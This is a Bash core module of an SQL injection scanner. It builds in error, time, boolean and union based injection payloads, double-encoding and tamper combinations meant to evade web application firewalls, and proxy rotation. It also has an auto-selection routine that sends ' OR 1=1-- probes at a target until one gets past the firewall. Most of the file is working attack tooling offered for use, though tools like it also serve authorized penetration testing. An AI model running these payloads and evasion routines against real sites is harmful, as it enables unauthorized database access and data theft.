#!/bin/bash
# SQLInjectionScanner Core Module - Essential functions for SQL injection scanning
# This file contains core functions used by the main scanner

# Exit on error and on unset variables
set -euo pipefail

# ------------------------- Utility Functions -------------------------

# Function to send Telegram message
send_telegram() {
  local msg="$1"
  if $NOTIFY; then
    curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
         -d "chat_id=${TELEGRAM_CHAT_ID}" -d "text=${msg}" &>/dev/null
  fi
}

# Function to log message based on verbosity
log() {
  local level="$1"
  local message="$2"
  
  case "$level" in
    "INFO")
      echo "[*] $message" | tee -a "$LOG_FILE"
      ;;
    "ERROR")
      echo "[!] $message" | tee -a "$LOG_FILE"
      ;;
    "SUCCESS")
      echo "[+] $message" | tee -a "$LOG_FILE"
      ;;
    "VERBOSE")
      if $VERBOSE; then
        echo "[V] $message" | tee -a "$LOG_FILE"
      fi
      ;;
    *)
      echo "[$level] $message" | tee -a "$LOG_FILE"
      ;;
  esac
}

# Get a proxy from the list
get_proxy() {
  if $PROXY_ROTATION && [[ -f "$PROXY_LIST" ]]; then
    # Get random proxy from the list
    local proxy_count=$(wc -l < "$PROXY_LIST")
    local random_line=$((RANDOM % proxy_count + 1))
    sed -n "${random_line}p" "$PROXY_LIST"
  elif $USE_PROXY; then
    echo "$PROXY"
  else
    echo ""
  fi
}

# Load payloads from file with given type
load_payloads() {
  local type="$1"
  local payload_file="Payloads/${type}_SQLi_Payloads.txt"
  
  if [[ -f "$payload_file" ]]; then
    # Read payloads from file, ignoring comments and empty lines
    grep -v "^#" "$payload_file" | grep -v "^$" || echo ""
  else
    # Return default payloads if file not found
    case "$type" in
      "Error_Based")
        echo "%27" 
        echo "%22"
        echo "%27 OR 1=1--"
        echo "1' OR '1'='1"
        ;;
      "Time_Based")
        echo "%27 OR SLEEP(5)--"
        echo "1' AND SLEEP(5)#"
        echo "(SELECT SLEEP(5))"
        ;;
      "Boolean_Based")
        echo "1' AND 1=1--"
        echo "1' AND 1=0--"
        ;;
      "Union_Based")
        echo "' UNION SELECT 1,2,3--"
        echo "' UNION SELECT NULL,NULL,NULL--"
        ;;
      "WAF_Bypass")
        echo "/*!50000%27*/"
        echo "%252527"
        echo "%2527"
        ;;
      *)
        echo "%27"
        ;;
    esac
  fi
}

# Apply tamper techniques to a payload
apply_tamper() {
  local payload="$1"
  local tamper_techniques="$2"
  local tampered_payload="$payload"
  
  # Directory where tamper scripts are stored
  local tamper_dir="tamper"
  
  # Split tamper techniques by comma
  IFS=',' read -r -a techniques <<< "$tamper_techniques"
  
  for technique in "${techniques[@]}"; do
    # Check if technique script exists
    local tamper_script="${tamper_dir}/${technique}.py"
    if [[ -f "$tamper_script" ]]; then
      # Apply tamper technique using Python
      tampered_payload=$(echo "$tampered_payload" | python3 "$tamper_script" 2>/dev/null || echo "$tampered_payload")
    fi
  done
  
  echo "$tampered_payload"
}

# URL-encode a string based on encoding level
encode_payload() {
  local payload="$1"
  local level="$ENCODE_LEVEL"
  
  case "$level" in
    1)
      # Basic encoding (just spaces and special chars)
      echo "$payload" | sed -e 's/ /%20/g' -e 's/!/%21/g' -e 's/"/%22/g' -e "s/'/%27/g" \
                           -e 's/(/%28/g' -e 's/)/%29/g' -e 's/\*/%2A/g' -e 's/\+/%2B/g' \
                           -e 's/,/%2C/g' -e 's/\//%2F/g' -e 's/:/%3A/g' -e 's/;/%3B/g' \
                           -e 's/=/%3D/g' -e 's/?/%3F/g' -e 's/@/%40/g'
      ;;
    2)
      # Medium encoding (add some creative encoding)
      # Convert to hex and mix encoding styles
      payload=$(echo "$payload" | sed -e 's/ /%20/g' -e 's/!/%21/g' -e 's/"/%22/g' -e "s/'/%27/g" \
                                 -e 's/(/%28/g' -e 's/)/%29/g' -e 's/\*/%2A/g' -e 's/\+/%2B/g' \
                                 -e 's/,/%2C/g' -e 's/\//%2F/g' -e 's/:/%3A/g' -e 's/;/%3B/g' \
                                 -e 's/=/%3D/g' -e 's/?/%3F/g' -e 's/@/%40/g')
      # Mix case in the encodings to bypass WAFs
      echo "$payload" | sed -e 's/%2/%2/g' -e 's/%3/%3/g' -e 's/%4/%4/g' -e 's/%5/%5/g'
      ;;
    3)
      # Advanced encoding (double encoding, mixed case)
      payload=$(echo "$payload" | sed -e 's/ /%20/g' -e 's/!/%21/g' -e 's/"/%22/g' -e "s/'/%27/g" \
                                 -e 's/(/%28/g' -e 's/)/%29/g' -e 's/\*/%2A/g' -e 's/\+/%2B/g' \
                                 -e 's/,/%2C/g' -e 's/\//%2F/g' -e 's/:/%3A/g' -e 's/;/%3B/g' \
                                 -e 's/=/%3D/g' -e 's/?/%3F/g' -e 's/@/%40/g')
      
      # Double encode some characters
      echo "$payload" | sed -e 's/%/%25/g' | sed -e 's/%25/%25/g'
      ;;
    *)
      # Default to basic encoding
      echo "$payload" | sed -e 's/ /%20/g' -e 's/!/%21/g' -e 's/"/%22/g' -e "s/'/%27/g" \
                           -e 's/(/%28/g' -e 's/)/%29/g' -e 's/\*/%2A/g' -e 's/\+/%2B/g' \
                           -e 's/,/%2C/g' -e 's/\//%2F/g' -e 's/:/%3A/g' -e 's/;/%3B/g' \
                           -e 's/=/%3D/g' -e 's/?/%3F/g' -e 's/@/%40/g'
      ;;
  esac
}

# Prepare curl command with authentication and custom headers
prepare_curl_cmd() {
  local url="$1"
  local cmd="curl -s -L -m $TIMEOUT"
  
  # Add proxy if specified
  if $USE_PROXY; then
    local proxy_to_use=$(get_proxy)
    if [[ -n "$proxy_to_use" ]]; then
      cmd="$cmd --proxy $proxy_to_use"
    fi
  fi
  
  # Add authentication
  if [[ -n "$AUTH_METHOD" && -n "$USERNAME" && -n "$PASSWORD" ]]; then
    case "$AUTH_METHOD" in
      "basic")
        cmd="$cmd --basic -u $USERNAME:$PASSWORD"
        ;;
      "digest")
        cmd="$cmd --digest -u $USERNAME:$PASSWORD"
        ;;
      "ntlm")
        cmd="$cmd --ntlm -u $USERNAME:$PASSWORD"
        ;;
    esac
  fi
  
  # Add cookie if specified
  if [[ -n "$COOKIE" ]]; then
    cmd="$cmd -b \"$COOKIE\""
  fi
  
  # Add custom headers
  if [[ -n "$CUSTOM_HEADERS" && -f "$CUSTOM_HEADERS" ]]; then
    while IFS= read -r header; do
      cmd="$cmd -H \"$header\""
    done < "$CUSTOM_HEADERS"
  fi
  
  # Add User-Agent
  cmd="$cmd -A \"$USER_AGENT\""
  
  # Complete command with URL
  cmd="$cmd -o - -w \"HTTP_CODE:%{http_code}\" \"$url\""
  
  echo "$cmd"
}

# Function to list available tamper techniques
list_tamper_techniques() {
  local tamper_dir="tamper"
  if [[ -d "$tamper_dir" ]]; then
    find "$tamper_dir" -name "*.py" -type f -not -name "__init__.py" | sed 's|tamper/||g' | sed 's/\.py$//g' | sort
  fi
}

# Function to automatically determine best tamper combo for WAF bypass
auto_select_tamper() {
  local url="$1"
  
  # Test with different tamper combinations
  local tamper_combos=(
    "space2comment,between,percentage"
    "space2randomblank,charencode,between"
    "randomcase,charunicodeencode,space2mssqlhash"
    "charunicodeencode,uppercase,space2plus"
    "space2morehash,versionedmorekeywords,apostrophemask"
    "between,randomcomments,charencode,versionedkeywords"
  )
  
  local best_combo=""
  local best_score=0
  
  for combo in "${tamper_combos[@]}"; do
    # Apply a test payload with this tamper combo
    local test_payload="' OR 1=1--"
    local tampered_payload=$(apply_tamper "$test_payload" "$combo")
    
    # Construct the URL and test for WAF detection
    local test_url="${url}?id=${tampered_payload}"
    local curl_cmd=$(prepare_curl_cmd "$test_url")
    local response=$(eval "$curl_cmd")
    
    # Check if WAF was bypassed (no block patterns, status code not 403/429)
    local http_code="${response##*HTTP_CODE:}"
    
    # Check for WAF bypass patterns
    if [[ ! "$response" =~ (WAF|Firewall|Blocked|Security|Attack|detect) && "$http_code" != "403" && "$http_code" != "429" ]]; then
      # This combo seems to bypass WAF
      best_combo="$combo"
      break
    fi
  done
  
  # If no specific combo worked, return default
  if [[ -z "$best_combo" ]]; then
    best_combo="space2comment,between,percentage,randomcase"
  fi
  
  echo "$best_combo"
}

# Generate a random ID for tracking
generate_scan_id() {
  # Generate a unique ID with timestamp and random string
  echo "SCAN_$(date '+%Y%m%d%H%M%S')_$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 8)"
}

# Export all functions
export -f send_telegram
export -f log
export -f get_proxy
export -f load_payloads
export -f apply_tamper
export -f encode_payload
export -f prepare_curl_cmd
export -f list_tamper_techniques
export -f auto_select_tamper
export -f generate_scan_id 